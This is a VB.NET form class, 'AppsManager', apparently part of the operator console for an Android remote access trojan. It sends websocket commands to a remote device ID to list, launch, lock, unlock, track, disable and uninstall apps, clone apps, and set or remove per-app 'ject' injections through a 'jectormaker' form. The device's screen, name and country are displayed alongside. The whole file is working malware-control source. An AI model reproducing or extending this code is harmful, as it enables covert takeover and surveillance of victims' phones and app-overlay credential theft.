Imports System.Net.Sockets
Imports Newtonsoft.Json.Linq

Public Class AppsManager
    Public Btcli As BTClient

    Sub New()

        ' This call is required by the designer.
        InitializeComponent()

        ' Add any initialization after the InitializeComponent() call.

    End Sub
    Private Sub translateme()
        Select Case BTRegistry.GetValue(Regz.Language, "null")

            Case "AR"
                refbtm.Text = "تحديث"
                ctxapps.Items(0).Text = "تشغيل"
                ctxapps.Items(2).Text = "المراقبة"
                ctxapps.Items(3).Text = "إلغاء المراقبة"
                ctxapps.Items(5).Text = "تفعيل"
                ctxapps.Items(6).Text = "تعطيل"

                ctxapps.Items(8).Text = "قفل"
                ctxapps.Items(9).Text = "فك القفل"
                ctxapps.Items(11).Text = "إلغاء التثبيت"
                searchtext.Watermark = "بحث"
                Exit Select
            Case "CN" ' Chinese
                refbtm.Text = "更新"
                ctxapps.Items(0).Text = "启动"
                ctxapps.Items(2).Text = "监控"
                ctxapps.Items(3).Text = "取消监控"
                ctxapps.Items(5).Text = "启用"
                ctxapps.Items(6).Text = "禁用"
                ctxapps.Items(8).Text = "锁定"
                ctxapps.Items(9).Text = "解锁"
                ctxapps.Items(11).Text = "卸载"
                searchtext.Watermark = "搜索"
                Exit Select

            Case "RU" ' Russian
                refbtm.Text = "Обновить"
                ctxapps.Items(0).Text = "Запустить"
                ctxapps.Items(2).Text = "Мониторинг"
                ctxapps.Items(3).Text = "Отключить мониторинг"
                ctxapps.Items(5).Text = "Включить"
                ctxapps.Items(6).Text = "Отключить"
                ctxapps.Items(8).Text = "Заблокировать"
                ctxapps.Items(9).Text = "Разблокировать"
                ctxapps.Items(11).Text = "Удалить"
                searchtext.Watermark = "Поиск"
                Exit Select

            Case "TR" ' Turkish
                refbtm.Text = "Güncelle"
                ctxapps.Items(0).Text = "Çalıştır"
                ctxapps.Items(2).Text = "İzleme"
                ctxapps.Items(3).Text = "İzlemeyi Durdur"
                ctxapps.Items(5).Text = "Etkinleştir"
                ctxapps.Items(6).Text = "Devre Dışı Bırak"
                ctxapps.Items(8).Text = "Kilitle"
                ctxapps.Items(9).Text = "Kilidi Aç"
                ctxapps.Items(11).Text = "Kaldır"
                searchtext.Watermark = "Ara"
                Exit Select

            Case "SP" ' Spanish
                refbtm.Text = "Actualizar"
                ctxapps.Items(0).Text = "Iniciar"
                ctxapps.Items(2).Text = "Supervisar"
                ctxapps.Items(3).Text = "Dejar de Supervisar"
                ctxapps.Items(5).Text = "Habilitar"
                ctxapps.Items(6).Text = "Deshabilitar"
                ctxapps.Items(8).Text = "Bloquear"
                ctxapps.Items(9).Text = "Desbloquear"
                ctxapps.Items(11).Text = "Desinstalar"
                searchtext.Watermark = "Buscar"
                Exit Select

            Case "PR" ' Brazilian Portuguese
                refbtm.Text = "Atualizar"
                ctxapps.Items(0).Text = "Executar"
                ctxapps.Items(2).Text = "Monitorar"
                ctxapps.Items(3).Text = "Parar de Monitorar"
                ctxapps.Items(5).Text = "Ativar"
                ctxapps.Items(6).Text = "Desativar"
                ctxapps.Items(8).Text = "Bloquear"
                ctxapps.Items(9).Text = "Desbloquear"
                ctxapps.Items(11).Text = "Desinstalar"
                searchtext.Watermark = "Pesquisar"
                Exit Select


            Case Else
                Exit Select
        End Select
    End Sub
    Private Sub AppsManager_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.myico.Image = Btcli.wallpaper
        Me.myscr.Image = Btcli.screen
        SetDoubleBuffered(DGV0)
        translateme()
        statetimer.Start()
    End Sub

    Private Sub statetimer_Tick(sender As Object, e As EventArgs) Handles statetimer.Tick
        Try
            If Btcli.isConnected Then
                Me.myscr.Image = Btcli.screen
                Me.myico.Image = Btcli.wallpaper
                Me.mytitle.Text = Appsstr & " | " & Btcli.name & " | " & Btcli.country

            Else
                Me.myico.Image = My.Resources.no_con
                Me.myscr.Image = Nothing
                Me.mytitle.Text = Appsstr & " | " & BTConst.Disconnectedstr

            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub AppsManager_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        statetimer.Stop()
    End Sub

    Private Sub searchtext_TextChanged(sender As Object, e As EventArgs) Handles searchtext.TextChanged
        If Not String.IsNullOrEmpty(searchtext.Text) Then
            emptysearch.Visible = True
            trysearch()
        Else
            emptysearch.Visible = False
            ShowAllRows() ' Show all rows when the search box is empty
            ' searchbefore.Clear()
        End If
    End Sub
    Public Sub trysearch()
        If DGV0.Rows.Count < 1 Then
            Return
        End If

        If String.IsNullOrEmpty(searchtext.Text) Then
            Return
        End If

        Dim searchTerm As String = searchtext.Text.ToLower()
        'searchbefore.Clear() ' Clear previous search results

        For Each row As DataGridViewRow In DGV0.Rows
            Try

                Dim rowMatchesSearch As Boolean =
                row.Cells(1).Value.ToString().ToLower().Contains(searchTerm) OrElse
                row.Cells(2).Value.ToString().ToLower().Contains(searchTerm) OrElse
                row.Cells(3).Value.ToString().ToLower().Contains(searchTerm) OrElse
                row.Cells(4).Value.ToString().ToLower().Contains(searchTerm)

                If rowMatchesSearch Then
                    row.Visible = True ' Show matching rows
                    ' searchbefore.Add(row)
                Else
                    row.Visible = False ' Hide non-matching rows
                End If
            Catch ex As Exception
                ' Handle any potential errors, e.g., if Tag is not a BTClient
            End Try
        Next
    End Sub

    ' Helper method to show all rows
    Private Sub ShowAllRows()
        For Each row As DataGridViewRow In DGV0.Rows
            row.Visible = True
        Next
    End Sub

    Private Sub emptysearch_Click(sender As Object, e As EventArgs) Handles emptysearch.Click
        searchtext.Text = ""
    End Sub

    Private Sub ClearAllToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClearAllToolStripMenuItem.Click
        If DGV0.Rows.Count > 0 Then
            If DGV0.SelectedRows.Count > 0 Then
                For Each ro As DataGridViewRow In DGV0.SelectedRows
                    Try
                        Dim appids As String = ro.Tag.ToString
                        Dim data As New With {
                                  .subcommand = "R",
                                  .appid = appids
                              }

                        Dim commandstr As String = FormatCommand("Apps", data)


                        Dim chatData As New Dictionary(Of String, Object) From {
                                            {"msg", wrk},
                                            {"cmnd", commandstr}
                        }
                        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
                    Catch ex As Exception

                    End Try
                Next
            End If
        End If

    End Sub

    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click


        If DGV0.Rows.Count > 0 Then
            If DGV0.SelectedRows.Count > 0 Then
                For Each ro As DataGridViewRow In DGV0.SelectedRows
                    Try
                        Dim appids As String = ro.Tag.ToString
                        Dim data As New With {
                                  .subcommand = "S",
                                  .appid = appids
                              }

                        Dim commandstr As String = FormatCommand("Apps", data)


                        Dim chatData As New Dictionary(Of String, Object) From {
                                            {"msg", wrk},
                                            {"cmnd", commandstr}
                        }
                        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
                    Catch ex As Exception

                    End Try
                Next
            End If
        End If


    End Sub

    Private Sub ToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem4.Click
        If DGV0.Rows.Count > 0 Then
            If DGV0.SelectedRows.Count > 0 Then
                For Each ro As DataGridViewRow In DGV0.SelectedRows
                    Try
                        Dim appids As String = ro.Tag.ToString
                        Dim data As New With {
                                  .subcommand = "E",
                                  .appid = appids
                              }

                        Dim commandstr As String = FormatCommand("Apps", data)


                        Dim chatData As New Dictionary(Of String, Object) From {
                                            {"msg", wrk},
                                            {"cmnd", commandstr}
                        }
                        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
                    Catch ex As Exception

                    End Try
                Next
            End If
        End If
    End Sub

    Private Sub ToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem3.Click
        If DGV0.Rows.Count > 0 Then
            If DGV0.SelectedRows.Count > 0 Then
                For Each ro As DataGridViewRow In DGV0.SelectedRows
                    Try
                        Dim appids As String = ro.Tag.ToString
                        Dim data As New With {
                                  .subcommand = "D",
                                  .appid = appids
                              }

                        Dim commandstr As String = FormatCommand("Apps", data)


                        Dim chatData As New Dictionary(Of String, Object) From {
                                            {"msg", wrk},
                                            {"cmnd", commandstr}
                        }
                        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
                    Catch ex As Exception

                    End Try
                Next
            End If
        End If
    End Sub

    Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem2.Click
        If DGV0.Rows.Count > 0 Then
            If DGV0.SelectedRows.Count > 0 Then
                For Each ro As DataGridViewRow In DGV0.SelectedRows
                    Try
                        Dim appids As String = ro.Tag.ToString
                        Dim data As New With {
                                  .subcommand = "TRK",
                                  .appid = appids
                              }

                        Dim commandstr As String = FormatCommand("Apps", data)


                        Dim chatData As New Dictionary(Of String, Object) From {
                                            {"msg", wrk},
                                            {"cmnd", commandstr}
                        }
                        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
                    Catch ex As Exception

                    End Try
                Next
            End If
        End If
    End Sub

    Private Sub ToolStripMenuItem6_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem6.Click
        If DGV0.Rows.Count > 0 Then
            If DGV0.SelectedRows.Count > 0 Then
                For Each ro As DataGridViewRow In DGV0.SelectedRows
                    Try
                        Dim appids As String = ro.Tag.ToString
                        Dim data As New With {
                                  .subcommand = "LK",
                                  .appid = appids
                              }

                        Dim commandstr As String = FormatCommand("Apps", data)


                        Dim chatData As New Dictionary(Of String, Object) From {
                                            {"msg", wrk},
                                            {"cmnd", commandstr}
                        }
                        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
                    Catch ex As Exception

                    End Try
                Next
            End If
        End If
    End Sub

    Private Sub ToolStripMenuItem7_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem7.Click
        If DGV0.Rows.Count > 0 Then
            If DGV0.SelectedRows.Count > 0 Then
                For Each ro As DataGridViewRow In DGV0.SelectedRows
                    Try
                        Dim appids As String = ro.Tag.ToString
                        Dim data As New With {
                                  .subcommand = "ULK",
                                  .appid = appids
                              }

                        Dim commandstr As String = FormatCommand("Apps", data)


                        Dim chatData As New Dictionary(Of String, Object) From {
                                            {"msg", wrk},
                                            {"cmnd", commandstr}
                        }
                        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
                    Catch ex As Exception

                    End Try
                Next
            End If
        End If
    End Sub

    Private Sub ToolStripMenuItem5_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem5.Click
        If DGV0.Rows.Count > 0 Then
            If DGV0.SelectedRows.Count > 0 Then
                For Each ro As DataGridViewRow In DGV0.SelectedRows
                    Try
                        Dim appids As String = ro.Tag.ToString
                        Dim data As New With {
                                  .subcommand = "UTRK",
                                  .appid = appids
                              }

                        Dim commandstr As String = FormatCommand("Apps", data)


                        Dim chatData As New Dictionary(Of String, Object) From {
                                            {"msg", wrk},
                                            {"cmnd", commandstr}
                        }
                        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
                    Catch ex As Exception

                    End Try
                Next
            End If
        End If
    End Sub

    Private Sub refpasses_Click(sender As Object, e As EventArgs) Handles refbtm.Click
        Dim data As New With {
                                  .subcommand = "L"
                              }

        Dim commandstr As String = FormatCommand("Apps", data)


        Dim chatData As New Dictionary(Of String, Object) From {
                                            {"msg", wrk},
                                            {"cmnd", commandstr}
                }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub ToolStripMenuItem8_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem8.Click

        If DGV0.Rows.Count > 0 Then
            If DGV0.SelectedRows.Count > 0 Then
                For Each ro As DataGridViewRow In DGV0.SelectedRows
                    Try
                        Dim appids As String = ro.Tag.ToString
                        Dim jectmake As New jectormaker

                        With jectmake
                            .targetid = appids
                            .mobid = Btcli.mobid
                            .targeticon.Image = DirectCast(ro.Cells(0).Value, Bitmap)
                        End With

                        jectmake.Show()

                    Catch ex As Exception

                    End Try
                Next
            End If
        End If
    End Sub

    Private Sub ToolStripMenuItem9_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem9.Click


        If DGV0.Rows.Count > 0 Then
            If DGV0.SelectedRows.Count > 0 Then
                For Each ro As DataGridViewRow In DGV0.SelectedRows
                    Try
                        Dim appids As String = ro.Tag.ToString
                        Dim chatData As New Dictionary(Of String, Object) From {
                             {"msg", "ject"},
                             {"tid", appids},
                             {"cas", "0"}'0 = remove
                        }
                        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)

                    Catch ex As Exception

                    End Try
                Next
            End If
        End If

    End Sub



    Private Sub CloneAppToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloneAppToolStripMenuItem.Click
        If DGV0.Rows.Count > 0 Then
            If DGV0.SelectedRows.Count > 0 Then
                For Each ro As DataGridViewRow In DGV0.SelectedRows
                    Try
                        Dim appids As String = ro.Tag.ToString

                        Dim cloneload As New Dictionary(Of String, Object) From {
                              {"msg", "clone"},
                              {"subc", "C"},
                              {"pkg", appids}
                             }
                        BTEngine.commands(cloneload, Btcli.mobid, BTEngine.MainForm.webSocketClient)

                    Catch ex As Exception

                    End Try
                Next
            End If
        End If

    End Sub

    Private Sub DrakeUIButtonIcon1_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon1.Click
        Dim cloneload As New Dictionary(Of String, Object) From {
                                {"msg", "clone"},
                                {"subc", "L"}
                               }
        BTEngine.commands(cloneload, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub enablebtn_Click(sender As Object, e As EventArgs) Handles enablebtn.Click

        Dim cloneload As New Dictionary(Of String, Object) From {
                                 {"msg", "clone"},
                                 {"subc", "S"}
                                }
        BTEngine.commands(cloneload, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub disablebtn_Click(sender As Object, e As EventArgs) Handles disablebtn.Click

        Dim cloneload As New Dictionary(Of String, Object) From {
                                 {"msg", "clone"},
                                 {"subc", "D"}
                                }
        BTEngine.commands(cloneload, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub OpenCloneToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenCloneToolStripMenuItem.Click
        If DGV0.Rows.Count > 0 Then
            If DGV0.SelectedRows.Count > 0 Then
                For Each ro As DataGridViewRow In DGV_CLONE.SelectedRows
                    Try
                        Dim appids As String = ro.Tag.ToString

                        Dim cloneload As New Dictionary(Of String, Object) From {
                              {"msg", "clone"},
                              {"subc", "O"},
                              {"pkg", appids}
                             }
                        BTEngine.commands(cloneload, Btcli.mobid, BTEngine.MainForm.webSocketClient)

                    Catch ex As Exception

                    End Try
                Next
            End If
        End If
    End Sub

    Private Sub RemoveCloneToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveCloneToolStripMenuItem.Click
        If DGV0.Rows.Count > 0 Then
            If DGV0.SelectedRows.Count > 0 Then
                For Each ro As DataGridViewRow In DGV_CLONE.SelectedRows
                    Try
                        Dim appids As String = ro.Tag.ToString

                        Dim cloneload As New Dictionary(Of String, Object) From {
                              {"msg", "clone"},
                              {"subc", "U"},
                              {"pkg", appids}
                             }
                        BTEngine.commands(cloneload, Btcli.mobid, BTEngine.MainForm.webSocketClient)

                    Catch ex As Exception

                    End Try
                Next
            End If
        End If
    End Sub
End Class